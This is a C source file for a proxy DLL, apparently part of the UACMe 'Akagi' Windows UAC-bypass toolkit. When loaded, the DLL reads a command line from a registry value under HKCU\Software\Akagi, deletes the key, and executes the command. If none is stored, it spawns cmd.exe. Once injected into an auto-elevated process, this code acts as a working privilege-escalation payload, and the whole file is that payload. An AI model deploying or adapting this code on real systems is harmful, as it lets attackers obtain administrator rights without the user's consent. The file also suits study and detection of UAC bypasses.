/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2017
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     2.70
*
*  DATE:        22 Mar 2017
*
*  Proxy dll entry point, Akatsuki.
*  Special dll for wow64 logger method.
*  Akatsuki must be special, isn't it?
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

//disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 6102) // Using %s from failed function call at line %u

#include <windows.h>
#include "shared\ntos.h"
#include <ntstatus.h>
#include "shared\minirtl.h"

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define T_AKAGI_KEY    L"\\Software\\Akagi"
#define T_AKAGI_PARAM  L"LoveLetter"

/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{

}

/*
* ucmQueryCustomParameter
*
* Purpose:
*
* Query custom parameter and run it.
*
*/
BOOL ucmQueryCustomParameter(
    VOID
)
{
    BOOL                    cond = FALSE, bResult = FALSE;

    OBJECT_ATTRIBUTES               obja;
    UNICODE_STRING                  usKey;
    NTSTATUS                        status;
    KEY_VALUE_PARTIAL_INFORMATION	keyinfo;

    SIZE_T                  memIO;
    HKEY                    hKey = NULL;
    PVOID                   ProcessHeap = NtCurrentPeb()->ProcessHeap;
    LPWSTR                  lpData = NULL, lpParameter = NULL, lpszParamKey = NULL;
    STARTUPINFOW            startupInfo;
    PROCESS_INFORMATION     processInfo;
    ULONG                   bytesIO = 0L;

    do {

        RtlSecureZeroMemory(&usKey, sizeof(usKey));
        status = RtlFormatCurrentUserKeyPath(&usKey);
        if (!NT_SUCCESS(status)) {
            break;
        }

        memIO = (_strlen_w(T_AKAGI_KEY) * sizeof(WCHAR)) +
            usKey.MaximumLength + sizeof(UNICODE_NULL);

        lpszParamKey = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpszParamKey == NULL) {
            RtlFreeUnicodeString(&usKey);
            break;
        }

        _strcpy_w(lpszParamKey, usKey.Buffer);
        _strcat_w(lpszParamKey, T_AKAGI_KEY);
        RtlFreeUnicodeString(&usKey);

        RtlSecureZeroMemory(&usKey, sizeof(usKey));
        RtlInitUnicodeString(&usKey, lpszParamKey);
        InitializeObjectAttributes(&obja, &usKey, OBJ_CASE_INSENSITIVE, NULL, NULL);

        status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
        if (!NT_SUCCESS(status)) {
            break;
        }

        RtlInitUnicodeString(&usKey, T_AKAGI_PARAM);
        status = NtQueryValueKey(hKey, &usKey, KeyValuePartialInformation, &keyinfo,
            sizeof(KEY_VALUE_PARTIAL_INFORMATION), &bytesIO);

        if ((status != STATUS_SUCCESS) &&
            (status != STATUS_BUFFER_TOO_SMALL) &&
            (status != STATUS_BUFFER_OVERFLOW))
        {
            break;
        }

        lpData = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, bytesIO);
        if (lpData == NULL) {
            break;
        }

        status = NtQueryValueKey(hKey, &usKey, KeyValuePartialInformation, lpData, bytesIO, &bytesIO);
        NtDeleteKey(hKey);
        NtClose(hKey);
        hKey = NULL;

        lpParameter = (LPWSTR)((PKEY_VALUE_PARTIAL_INFORMATION)lpData)->Data;
        if (lpParameter != NULL) { //-V547
            DbgPrint("Akagi letter found: %ws", lpParameter);

            RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
            RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
            startupInfo.cb = sizeof(startupInfo);
            GetStartupInfoW(&startupInfo);

            bResult = CreateProcessW(NULL, lpParameter, NULL, NULL, FALSE, 0, NULL,
                NULL, &startupInfo, &processInfo);

            if (bResult) {
                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);
            }

        }

        RtlFreeHeap(ProcessHeap, 0, lpData);

    } while (cond);

    if (hKey != NULL) {
        NtDeleteKey(hKey);
        NtClose(hKey);
    }
    if (lpszParamKey != NULL) {
        RtlFreeHeap(ProcessHeap, 0, lpszParamKey);
    }

    return bResult;
}

/*
* ucmExpandEnvironmentStrings
*
* Purpose:
*
* Reimplemented ExpandEnvironmetStrings to minimize kernel32 import.
*
*/
DWORD ucmExpandEnvironmentStrings(
    LPCWSTR lpSrc,
    LPWSTR lpDst,
    DWORD nSize
)
{
    NTSTATUS Status;
    UNICODE_STRING Source, Destination;
    ULONG Length;
    DWORD iSize;

    if (nSize > (MAXUSHORT >> 1) - 2) {
        iSize = (MAXUSHORT >> 1) - 2;
    }
    else {
        iSize = nSize;
    }

    RtlSecureZeroMemory(&Source, sizeof(Source));
    RtlInitUnicodeString(&Source, lpSrc);
    Destination.Buffer = lpDst;
    Destination.Length = 0;
    Destination.MaximumLength = (USHORT)(iSize * sizeof(WCHAR));
    Length = 0;
    Status = RtlExpandEnvironmentStrings_U(NULL,
        &Source,
        &Destination,
        &Length
    );
    if (NT_SUCCESS(Status) || Status == STATUS_BUFFER_TOO_SMALL) {
        return(Length / sizeof(WCHAR));
    }
    else {
        RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
        return 0;
    }
}

/*
* DllMain
*
* Purpose:
*
* Proxy dll entry point, process parameter if exist or start cmd.exe and exit immediatelly.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    DWORD                   cch;
    TCHAR                   cmdbuf[MAX_PATH * 2], sysdir[MAX_PATH + 1];
    STARTUPINFO             startupInfo;
    PROCESS_INFORMATION     processInfo;

    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH) {

        OutputDebugString(TEXT("Hello, Admiral"));

        if (!ucmQueryCustomParameter()) {

            RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
            RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
            startupInfo.cb = sizeof(startupInfo);
            GetStartupInfoW(&startupInfo);

            RtlSecureZeroMemory(sysdir, sizeof(sysdir));
            cch = ucmExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysdir, MAX_PATH);
            if ((cch != 0) && (cch < MAX_PATH)) {
                RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
                _strcpy(cmdbuf, sysdir);
                _strcat(cmdbuf, TEXT("cmd.exe"));

                if (CreateProcessW(cmdbuf, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL,
                    sysdir, &startupInfo, &processInfo))
                {
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);
                }
            }

        }
    }
    return TRUE;
}
